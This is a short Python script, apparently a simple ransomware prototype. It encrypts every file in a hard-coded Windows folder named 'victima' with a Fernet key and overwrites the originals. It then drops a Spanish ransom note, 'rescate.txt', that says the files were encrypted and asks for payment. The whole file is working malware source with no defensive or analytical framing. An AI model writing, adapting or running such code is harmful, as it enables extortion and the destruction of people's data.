from cryptography.fernet import Fernet
import os

def generate_key():
    key = Fernet.generate_key()
    with open('key.key', 'wb') as key_file:
        key_file.write(key)

def load_key():
    return open('key.key','rb').read()

def encrypt(items,key):
    f = Fernet(key)
    for item in items:
        with open(item,'rb') as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(item, 'wb') as file:
            file.write(encrypted_data)
if __name__ == '__main__':
    path_to_encrypt = 'C:\\Users\\Zerskers\\Desktop\\victima'
    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt+'\\'+ item for item in items]

    generate_key()
    key = load_key()
    encrypt(full_path,key)

    with open(path_to_encrypt+'\\'+'rescate.txt', 'w') as file:
        file.write('Ficheros encriptados por pepe- \n')
        file.write('realizar pago a la siguiente direcicon')